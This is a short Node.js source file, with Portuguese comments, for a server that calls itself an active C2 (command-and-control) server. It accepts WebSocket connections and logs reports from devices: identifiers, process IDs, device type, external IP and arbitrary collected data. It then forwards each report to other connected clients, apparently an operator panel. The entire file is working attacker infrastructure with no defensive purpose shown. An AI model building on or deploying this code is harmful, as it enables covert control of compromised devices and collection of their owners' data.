const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.send('Servidor C2 ativo. Acesse /viewer.html para visualizar.');
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  console.log(`📡 Cliente WebSocket conectado: ${req.socket.remoteAddress}`);

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message.toString());

      // Exemplo: mensagens de informações de dispositivo
      if (data.subc === 'dinfo') {
        console.log("📱 Informações do dispositivo recebidas:");
        console.log(`   IDF: ${data.idf}`);
        console.log(`   PID: ${data.pid}`);
        console.log(`   Tipo: ${data.itype}`);
        console.log(`   IP externo: ${data.cip}`);
        console.log(`   Dados:\n${data.data}`);

        // Se quiser retransmitir para outros clientes (painel, etc.)
        wss.clients.forEach(client => {
          if (client !== ws && client.readyState === WebSocket.OPEN) {
            client.send(message.toString());
          }
        });
      } else {
        console.log("📩 Mensagem recebida:", data);
      }
    } catch (err) {
      console.error("❌ Erro ao processar mensagem:", err);
    }
  });

  ws.on('close', () => {
    console.log("❌ Cliente desconectado");
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
});
